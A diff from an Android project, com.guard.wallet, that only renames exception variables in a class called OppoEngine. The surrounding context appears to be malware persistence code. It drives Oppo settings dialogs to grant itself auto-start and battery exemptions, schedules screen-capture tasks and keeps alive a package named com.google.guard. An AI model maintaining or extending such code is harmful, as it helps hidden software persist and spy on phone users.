@@ -58,8 +58,8 @@ public final class OppoEngine extends KeepAliveEngine {
         super(buildAllListenWindows(), "com.android.settings");
         try {
             this.p.schedule(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 4), 100L, TimeUnit.SECONDS);
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
         }
     }
 
@@ -294,8 +294,8 @@ public final class OppoEngine extends KeepAliveEngine {
                 Log.e("o.v", "已进入是否完全允许对话框");
                 return true;
             }
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
         }
         return false;
     }
@@ -313,8 +313,8 @@ public final class OppoEngine extends KeepAliveEngine {
                 return true;
             }
             return false;
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
             return false;
         }
     }
@@ -331,8 +331,8 @@ public final class OppoEngine extends KeepAliveEngine {
                 Log.e("o.v", "已进入App耗电管理窗口");
                 return true;
             }
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
         }
         return false;
     }
@@ -344,8 +344,8 @@ public final class OppoEngine extends KeepAliveEngine {
                 Log.e("o.v", "已进入自启动管理窗口");
                 return true;
             }
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
         }
         return false;
     }
@@ -427,8 +427,8 @@ public final class OppoEngine extends KeepAliveEngine {
             Log.e("o.v", "RadioButton 模式: 无对话框，假设直接选中成功");
             this.s.set(true);
             return true;
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
             return false;
         }
     }
@@ -456,8 +456,8 @@ public final class OppoEngine extends KeepAliveEngine {
             } else {
                 Log.e("o.v", "允许自启动栏目查找失败");
             }
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
         }
         return false;
     }
@@ -485,8 +485,8 @@ public final class OppoEngine extends KeepAliveEngine {
             }
             Log.e("o.v", errMsg);
             return false;
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
             return false;
         }
     }
@@ -510,8 +510,8 @@ public final class OppoEngine extends KeepAliveEngine {
             state.setRetryCount(state.getRetryCount() + 1);
             com.guard.wallet.utils.SharedPrefsManager.L(state);
             Log.e("o.v", pkg.concat(" 进程保活策略已保存"));
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
         }
     }
 
@@ -547,8 +547,8 @@ public final class OppoEngine extends KeepAliveEngine {
                 savePowerControlState("com.google.guard");
                 Z();
             }
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
         }
     }
 
@@ -589,8 +589,8 @@ public final class OppoEngine extends KeepAliveEngine {
                     EngineHelper.cW();
                     this.d();
                 }
-            } catch (Exception e2) {
-                AppUtils.s("o.v", e2);
+            } catch (Exception ex) {
+                AppUtils.s("o.v", ex);
             }
             lock.unlock();
         }
@@ -645,8 +645,8 @@ public final class OppoEngine extends KeepAliveEngine {
                     com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.MediaProjectionTask(this, 3), delegateId);
                 }
             }
-        } catch (Exception e2) {
-            AppUtils.s("o.v", e2);
+        } catch (Exception ex) {
+            AppUtils.s("o.v", ex);
         }
     }
 }
